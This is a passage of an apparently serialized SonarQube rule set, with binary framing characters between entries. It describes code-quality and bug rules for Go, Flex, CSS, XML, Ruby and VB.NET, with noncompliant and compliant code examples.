	case 1:
		bar()
	}
}

func executeAll() {
	methodCall1()
	methodCall2()
	methodCall3()
	methodCall4()
        methodCall5()
        methodCall6()
}
</pre>Z
CODE_SMELL
◊
go:S104À
goS104,Files should not have too many lines of code"MAJOR*go:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
â
go:S107˝
goS107-Functions should not have too many parameters"MAJOR*go:™<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
func foo(p1 int, p2 int, p3 int, p4 int, p5 int) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func foo(p1 int, p2 int, p3 int, p4 int) {
  // ...
}
</pre>Z
CODE_SMELL
∫
go:S108Æ
goS108.Nested blocks of code should not be left empty"MAJOR*go:⁄<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
func compute(a int, b int) {
	sum := a + b
	if  sum &gt; 0 { } // Noncompliant; empty on purpose or missing piece of code?
	fmt.Println("Result:", sum)
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func compute(a int, b int) {
	sum := a + b
	if  sum &gt; 0 {
		fmt.Println("Positive result")
	}
	fmt.Println("Result:", sum)
}
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty. <code>for</code> without <code>init</code> and <code>post</code>
statements with empty blocks are ignored as well.</p>Z
CODE_SMELL
®	
go:S1764õ	
goS1764KIdentical expressions should not be used on both sides of a binary operator"MAJOR*go:∞<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
func main() {
  v1 := (true &amp;&amp; false) &amp;&amp; (true &amp;&amp; false) // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func main() {
  v1 := (true &amp;&amp; false) // Compliant
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores <code>*</code>, <code>+</code>, <code>&lt;&lt;</code> and <code>=</code>. </p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=go%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>ZBUG
≈
go:S1862∏
goS1862BRelated "if/else if" statements should not have the same condition"MAJOR*go:÷
<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first
one with a condition that evaluates to <code>true</code>. </p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
func example(condition1, condition2 bool) {
  if condition1 {
  } else if condition1 { // Noncompliant
  }
}
</pre>
<pre>
func SwitchWithMultipleConditions(param int) {
  switch param {
  case 1, 2, 3:
    fmt.Println("&gt;1")
  case 3, 4, 5: // Noncompliant; 3 is duplicated
    fmt.Println("&lt;1")
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func example(condition1, condition2 bool) {
  if condition1 {
  } else if condition2 { // Compliant
  }
}
</pre>
<pre>
func SwitchWithMultipleConditions(param int) {
  switch param {
  case 1, 2, 3:
    fmt.Println("&gt;1")
  case 4, 5: // Compliant
    fmt.Println("&lt;1")
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
Ò
go:S1763‰
goS17633Jump statements should not be followed by dead code"MAJOR*go:ë<p>Jump statements (<code>return</code>, <code>break</code>, <code>continue</code>, <code>goto</code>) and <code>throw</code> expressions move control
flow out of the current code block. So any unlabelled statements that come after a jump are dead code. </p>
<h2>Noncompliant Code Example</h2>
<pre>
func add(x, y int) int {
	return x + y // Noncompliant
	z := x + y // dead code
}
</pre>
<h2>Compliant Solution</h2>
<pre>
func add(x, y int) int {
	return x + y // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/561.html">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
É

go:S1145ˆ	
goS1145FUseless "if(true) {...}" and "if(false){...}" blocks should be removed"MAJOR*go:ê	<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if true {
	doSomething()
}

if false {
	doSomething()
}
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething();
...
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
</ul>ZBUG
≈
go:S122π
goS122&Statements should be on separate lines"MAJOR*go:Ì<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
foo(); bar() // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
foo()
bar()
</pre>
<h2>Exceptions</h2>
<p>Control flow statements with a single nested statement are ignored.</p>
<pre>
if condition { doSomething() } // Compliant
</pre>Z
CODE_SMELL
Ú
go:S2757Â
goS2757'"=+" should not be used instead of "+=""MAJOR*go:û<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var target, num = -5, 3

target =- num  // Noncompliant; target = -3. Is that really what's meant?
target =+ num // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
var target, num = -5, 3

target = -num  // Compliant; intent to assign inverse value of num is clear
target += num
</pre>ZBUG

go:S3923„
goS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*go:Ï<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if b == 0 {  // Noncompliant
  doOneMoreThing()
} else {
  doOneMoreThing()
}

switch i {  // Noncompliant
  case 1:
    doSomething()
  case 2:
    doSomething()
  case 3:
    doSomething()
  default:
    doSomething()
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if b == 0 {    //no issue, this could have been done on purpose to make the code more readable
  doSomething()
} else if b == 1 {
  doSomething()
}
</pre>ZBUG
Ç
go:S138ˆ
goS1384Functions and methods should not have too many lines"MAJOR*go:ú<p>A function that grows too large tends to aggregate too many responsibilities.</p>
<p>Such functions inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.</p>
<p>Those smaller functions will not only be easier to understand, but also probably easier to test.</p>Z
CODE_SMELL
¨
common-go:FailedUnitTestsé
	common-goFailedUnitTests!Failed unit tests should be fixed"MAJOR*go:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
â
common-go:SkippedUnitTestsÍ
	common-goSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*go:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL
Ì
common-go:DuplicatedBlocksŒ
	common-goDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*go:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
ó
$common-go:InsufficientCommentDensityÓ
	common-goInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*go:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
„
$common-go:InsufficientBranchCoverage∫
	common-goInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*go:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
◊
"common-go:InsufficientLineCoverage∞
	common-goInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*go:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
≤
common-flex:FailedUnitTestsí
common-flexFailedUnitTests!Failed unit tests should be fixed"MAJOR*flex:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
è
common-flex:SkippedUnitTestsÓ
common-flexSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*flex:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL
Û
common-flex:DuplicatedBlocks“
common-flexDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*flex:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
ù
&common-flex:InsufficientCommentDensityÚ
common-flexInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*flex:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
›
$common-flex:InsufficientLineCoverage¥
common-flexInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*flex:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
È
&common-flex:InsufficientBranchCoverageæ
common-flexInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*flex:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
„
	css:S4666’
cssS4666"Selectors should not be duplicated"MAJOR*css:ä<p>Duplication of selectors might indicate a copy-paste mistake. The rule detects the following kinds of duplications:</p>
<ul>
  <li> within a list of selectors in a single rule set </li>
  <li> for duplicated selectors in different rule sets within a single stylesheet. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
.foo, .bar, .foo { ... }  /* Noncompliant */

.class1 { ... }
.class1 { ... }  /* Noncompliant */
</pre>
<h2>Compliant Solution</h2>
<pre>
.foo, .bar { ... }

.class1 { ... }
.class2 { ... }
</pre>Z
CODE_SMELL
∏
	css:S4655™
cssS4655."!important" should not be used on "keyframes""MAJOR*css:⁄<p><code>!important</code> within keyframes declarations is completely ignored in some browsers and therefore it should not be used to be consistent
among all browsers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@keyframes kf {
  from { margin-top: 50px; }
  50%  { margin-top: 150px !important; } /* Noncompliant; ignored */
  to   { margin-top: 100px; }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@keyframes kf {
  from { margin-top: 50px; }
  50%  { margin-top: 150px; }
  to   { margin-top: 100px; }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@keyframes#!important_in_a_keyframe">Mozilla Web Technology for Developers</a> -
  <code>!important</code> in a keyframe </li>
</ul>ZBUG
™
	css:S4667ú
cssS4667CSS files should not be empty"MAJOR*css:W<p>This rule raises an issue when a CSS file is empty (ie: containing only spaces).</p>Z
CODE_SMELL
†
	css:S4656í
cssS4656#Properties should not be duplicated"MAJOR*css:Õ<p>CSS allows duplicate property names but only the last instance of a duplicated name determines the actual value that will be used for it.
Therefore, changing values of other occurrences of a duplicated name will have no effect and may cause misunderstandings and bugs.</p>
<p>This rule ignores <code>$sass</code>, <code>@less</code>, and <code>var(--custom-property)</code> variable syntaxes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a {
  color: pink;
  background: orange;
  color: orange
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a {
  color: pink;
  background: orange
}
</pre>ZBUG
å
	css:S4662˛
cssS4662"at-rules" should be valid"MAJOR*css:¬<p>The W3C specifications define the valid <code>at-rules</code>. Only the official and browser-specific <code>at-rules</code> should be used to get
the expected impact in the final rendering.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@encoding "utf-8";
</pre>
<h2>Compliant Solution</h2>
<pre>
@charset "utf-8";
</pre>ZBUG
…
	css:S4661ª
cssS4661Media features should be valid"MAJOR*css:˚<p>The W3C specifications define the valid media features. Only the official and browser-specific media features should be used to get the expected
impact in the final rendering.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@media screen and (unknown: 1000px) { .. }
</pre>
<h2>Compliant Solution</h2>
<pre>
@media screen and (width: 1000px) { .. }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3schools.com/cssref/css3_pr_mediaquery.asp">CSS Specification</a> - <code>@media</code> rule </li>
</ul>ZBUG
∫
	css:S4652¨
cssS4652$Strings should not contain new lines"MAJOR*css:ﬂ<p>According to the W3C specifications:</p>
<blockquote>
  <p>A string cannot directly contain a newline. To include a newline in a string, use an escape representing the line feed character in ISO-10646
  (U+000A), such as "\A" or "\00000a".</p>
  <p>[...]</p>
  <p>It is possible to break strings over several lines, for aesthetic or other reasons, but in such a case the newline itself has to be escaped with
  a backslash (\).</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
a {
  content: "first
    second";
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a {
  content: "first\Asecond";
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/TR/CSS2/syndata.html#strings">CSS Specification</a> - Strings </li>
</ul>Z
CODE_SMELL
Œ
	css:S4659¿
cssS4659&Pseudo-class selectors should be valid"MAJOR*css:¯<p>The W3C specifications define the valid pseudo-class selectors. Only the official and browser-specific pseudo-class selectors should be used to get
the expected impact in the final rendering.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a:hoverr { /* Noncompliant; there is a typo on the word "hover" */
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a:hover {
...
}
</pre>ZBUG
√
	css:S4648µ
cssS4648'Duplicated font names should be removed"MAJOR*css:Â<p>Having duplicated font names doesn't help to read the font declaration and may be an indicator the author of the line was not sure how to configure
it. This rule raises an issue when <code>font</code> or <code>font-family</code> properties contain a duplicated font name. This rule ignores
<code>$sass</code>, <code>@less</code>, and <code>var(--custom-property)</code> variable syntaxes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a {
  font-family: 'Georgia', Georgia, serif; /* Noncompliant; 'Georgia' is duplicated */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a {
  font-family: Georgia, serif;
}
</pre>Z
CODE_SMELL

	css:S4658‚
cssS4658Empty blocks should be removed"MAJOR*css:õ<p>Leftover empty blocks are usually introduced by mistake. They are useless and prevent readability of the code. They should be removed or completed
with real code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a { }
</pre>
<h2>Compliant Solution</h2>
<pre>
a { color: pink; }
</pre>Z
CODE_SMELL
Ú
	css:S4649‰
cssS4649AFont declarations should contain at least one generic font family"MAJOR*css:Å<p>If none of the font names defined in a <code>font</code> or <code>font-family</code> declaration are available on the browser of the user, the
browser will display the text using its default font. It's recommended to always define a generic font family for each declaration of
<code>font</code> or <code>font-family</code> to get a less degraded situation than relying on the default browser font. All browsers should implement
a list of generic font matching these families: <code>Serif</code>, <code>Sans-serif</code>, <code>cursive</code>, <code>fantasy</code>,
<code>Monospace</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a {
  font-family: Helvetica, Arial, Verdana, Tahoma; /* Noncompliant; there is no generic font family in the list */
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a {
  font-family: Helvetica, Arial, Verdana, Tahoma, sans-serif;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.w3.org/TR/CSS2/fonts.html#generic-font-families">CSS Specification</a> - Generic font families </li>
</ul>ZBUG
Ÿ
	css:S4660À
cssS4660(Pseudo-element selectors should be valid"MAJOR*css:Å<p>The W3C specifications define the valid pseudo-element selectors. Only the official and browser-specific pseudo-element selectors should be used to
get the expected impact in the final rendering.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a::beforre { /* Noncompliant; there is a typo on the word "before" */
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a::before {
...
}
</pre>ZBUG
Ø
common-xml:FailedUnitTestsê

common-xmlFailedUnitTests!Failed unit tests should be fixed"MAJOR*xml:ºTest failures or errors generally indicate that regressions have been introduced. Those tests should be handled as soon as possible to reduce the cost to fix the corresponding regressions.ZBUG
å
common-xml:SkippedUnitTestsÏ

common-xmlSkippedUnitTests4Skipped unit tests should be either removed or fixed"MAJOR*xml:~Skipped unit tests are considered as dead code. Either they should be activated again (and updated) or they should be removed.Z
CODE_SMELL

common-xml:DuplicatedBlocks–

common-xmlDuplicatedBlocks2Source files should not have any duplicated blocks"MAJOR*xml:dAn issue is created on a file as soon as there is at least one block of duplicated code on this fileZ
CODE_SMELL
ö
%common-xml:InsufficientCommentDensity

common-xmlInsufficientCommentDensity>Source files should have a sufficient density of comment lines"MAJOR*xml:ÌAn issue is created on a file as soon as the density of comment lines on this file is less than the required threshold. The number of comment lines to be written in order to reach the required threshold is provided by each issue message.Z
CODE_SMELL
⁄
#common-xml:InsufficientLineCoverage≤

common-xmlInsufficientLineCoverage.Lines should have sufficient coverage by tests"MAJOR*xml:¡An issue is created on a file as soon as the line coverage on this file is less than the required threshold. It gives the number of lines to be covered in order to reach the required threshold.Z
CODE_SMELL
Ê
%common-xml:InsufficientBranchCoverageº

common-xmlInsufficientBranchCoverage1Branches should have sufficient coverage by tests"MAJOR*xml:∆An issue is created on a file as soon as the branch coverage on this file is less than the required threshold. It gives the number of branches to be covered in order to reach the required threshold.Z
CODE_SMELL
æ
	xml:S1134∞
xmlS1134Track uses of "FIXME" tags"MAJOR*xml:Ì<p><code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.</p>
<p>Sometimes the developer will not have the time or will simply forget to get back to that tag.</p>
<p>This rule is meant to track those tags and to ensure that they do not go unnoticed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;!-- FIXME we should update version to 3.8.1 --&gt;
&lt;dependency&gt;
  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
  &lt;artifactId&gt;commons-lang3&lt;/artifactId&gt;
  &lt;version&gt;3.6&lt;/version&gt;
&lt;/dependency&gt;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/546.html">MITRE, CWE-546</a> - Suspicious Comment </li>
</ul>Z
CODE_SMELL
≤
xml:S125•
xmlS125,Sections of code should not be commented out"MAJOR*xml:—<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 2.4 - Sections of code should not be "commented out". </li>
  <li> MISRA C++:2008, 2-7-2 - Sections of code shall not be "commented out" using C-style comments. </li>
  <li> MISRA C++:2008, 2-7-3 - Sections of code should not be "commented out" using C++ comments. </li>
  <li> MISRA C:2012, Dir. 4.4 - Sections of code should not be "commented out" </li>
</ul>Z
CODE_SMELL
ƒ
xml:S103∑
xmlS103Lines should not be too long"MAJOR*xml:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
À
xml:XPathCheck∏
xml
XPathCheckTrack breaches of an XPath rule"MAJOR*xml:È<p>This rule allows the definition of custom rules using XPath expressions.</p>
<p>Issues are created depending on the return value of the XPath expression. If the XPath expression returns:</p>
<ul>
  <li> a single or list of AST nodes, then a line issue with the given message is created for each node </li>
  <li> a boolean, then a file issue with the given message is created only if the boolean is true </li>
  <li> anything else, no issue is created </li>
</ul>
<p>Here is an example of an XPath expression to log an issue on each 'td' tag using the 'nowrap' deprecated attribute: </p>
<pre>
//td[@nowrap]
</pre>@Z
CODE_SMELL
Ó
xml:NewlineCheckŸ
xmlNewlineCheck#Newlines should follow each element"MAJOR*xml:Ü<p>Each element should be on a line to itself.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;parent&gt;&lt;child /&gt;&lt;/parent&gt;  &lt;!-- Noncompliant --&gt;
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;parent&gt;
  &lt;child /&gt;
&lt;/parent&gt;
</pre>Z
CODE_SMELL
Ø
	xml:S2260°
xmlS2260XML parser failure"MAJOR*xml:Ê<p>When the XML parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number
of files that do not parse but also to easily find out why they do not parse.</p>Z
CODE_SMELL
®

ruby:S3776ô
rubyS37768Cognitive Complexity of functions should not be too high"CRITICAL*ruby:≥<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>Z
CODE_SMELL
≥
	ruby:S131•
rubyS131,"case" statements should have "else" clauses"CRITICAL*ruby:Ã<p>The requirement for a final <code>else</code> clause is defensive programming. The clause should either take appropriate action, or contain a
suitable comment as to why no action is taken.</p>
<h2>Noncompliant Code Example</h2>
<pre>
case param
  when 1
    do_something()
  when 2
    do_something_else()
end
</pre>
<h2>Compliant Solution</h2>
<pre>
case param
  when 1
    do_something()
  when 2
    do_something_else()
  else
    handle_error('error_message')
end
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used. </li>
  <li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause </li>
  <li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement. </li>
  <li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause </li>
  <li> MISRA C:2012, 16.1 - All switch statements shall be well-formed </li>
  <li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label </li>
  <li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement
  </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
∆
	ruby:S134∏
rubyS134rControl flow statements "if", "for", "while", "until", "case" and "begin...rescue" should not be nested too deeply"CRITICAL*ruby:ô<p>Nested <code>if</code>, <code>for</code>, <code>while</code>, <code>until</code>, <code>case</code> and <code>begin...rescue</code> statements are
key ingredients for making what's known as "Spaghetti code".</p>
<p>Such code is hard to read, refactor and therefore maintain.</p>Z
CODE_SMELL
ÿ

ruby:S1192…
rubyS1192(String literals should not be duplicated"CRITICAL*ruby:Û<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>Z
CODE_SMELL
‹
	ruby:S126Œ
rubyS126:"if ... else if" constructs should end with "else" clauses"CRITICAL*ruby:Á
<p>This rule applies whenever an <code>if</code> statement is followed by one or more <code>elsif</code> statements; the final <code>elsif</code>
should be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming.</p>
<p>The <code>else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>else</code> clause in a <code>case</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if x == 0
  doSomething
elsif x == 1
  doSomethingElse
end
</pre>
<h2>Compliant Solution</h2>
<pre>
if x == 0
  doSomething
elsif x == 1
  doSomethingElse
else
  raise 'An error has occured'
end
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>Z
CODE_SMELL
ª

ruby:S1067¨
rubyS1067%Expressions should not be too complex"CRITICAL*ruby:Ÿ<p>The complexity of an expression is defined by the number of <code>&amp;&amp;</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code>
operators it contains.</p>
<p>A single expression's complexity should not become too high to keep the code readable.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold value of 3:</p>
<pre>
if ((condition1 &amp;&amp; condition2) || (condition3 &amp;&amp; condition4)) &amp;&amp; condition5
  ...
end
</pre>
<h2>Compliant Solution</h2>
<pre>
if (myFirstCondition() || mySecondCondition()) &amp;&amp; myLastCondition()
  ...
end
</pre>Z
CODE_SMELL
è

ruby:S1186Ä
rubyS1186Methods should not be empty"CRITICAL*ruby:∑<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed to prevent an unexpected behavior in production. </li>
  <li> It is not yet, or never will be, supported. In this case an exception should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>Z
CODE_SMELL
¿

ruby:S1821±
rubyS1821&"case" statements should not be nested"CRITICAL*ruby:›<p>Nested <code>case</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>case</code> as belonging
to an outer statement. Therefore nested <code>case</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>case</code> statements, but if you cannot, then consider moving the
inner <code>case</code> to another function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
def foo(n, m)
  case n
  when 0
      case m  # Noncompliant; nested case
      when 0 then puts "0"
        # ...
      end
  when 1 then puts "1"
  else puts "2"
  end
end
</pre>
<h2>Compliant Solution</h2>
<pre>
def foo(n, m)
  case n
  when 0
    bar(m)
  when 1 then puts "1"
  else puts "2"
  end
end

def bar(m)
  case m
  when 0 then puts "0"
    # ...
  end
end
</pre>Z
CODE_SMELL
´
vbnet:S2346õ
vbnetS2346<Flags enumerations zero-value members should be named "None""CRITICAL*vbnet:Ø<p>Consistent use of "None" in flags enumerations indicates that all flag values are cleared. The value 0 should not be used to indicate any other
state, since there is no way to check that the bit <code>0</code> is set.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;Flags()&gt;
Enum FruitType
    Void = 0        ' Non-Compliant
    Banana = 1
    Orange = 2
    Strawberry = 4
End Enum
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;Flags()&gt;
Enum FruitType
    None = 0        ' Compliant
    Banana = 1
    Orange = 2
    Strawberry = 4
End Enum
</pre>Z
CODE_SMELL
◊
vbnet:S2340«
vbnetS2340D"Do" loops should not be used without a "While" or "Until" condition"CRITICAL*vbnet:”<p>A <code>Do ... Loop</code> without a <code>While</code> or <code>Until</code> condition must be terminated by an unstructured <code>Exit Do</code>
statement. It is safer and more readable to use structured loops instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Module Module1
    Sub Main()
        Dim i = 1

        Do                        ' Non-Compliant
            If i = 10 Then
                Exit Do
            End If

            Console.WriteLine(i)

            i = i + 1
        Loop
    End Sub
End Module
</pre>
<h2>Compliant Solution</h2>
<pre>
Module Module1
    Sub Main()
        For i = 1 To 9            ' Compliant
            Console.WriteLine(i)
        Next
    End Sub
End Module
</pre>Z
CODE_SMELL
’
vbnet:S1541≈
vbnetS1541>Functions, procedures and properties should not be too complex"CRITICAL*vbnet:◊<p>The cyclomatic complexity of a function, procedure or property should not exceed a defined threshold. Complex code can perform poorly and will in
any case be difficult to understand and therefore to maintain.</p>Z
CODE_SMELL
¨
vbnet:S1821ú
vbnetS1821("switch" statements should not be nested"CRITICAL*vbnet:ƒ<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as
belonging to an outer statement. Therefore nested <code>switch</code> statements should be avoided.</p>
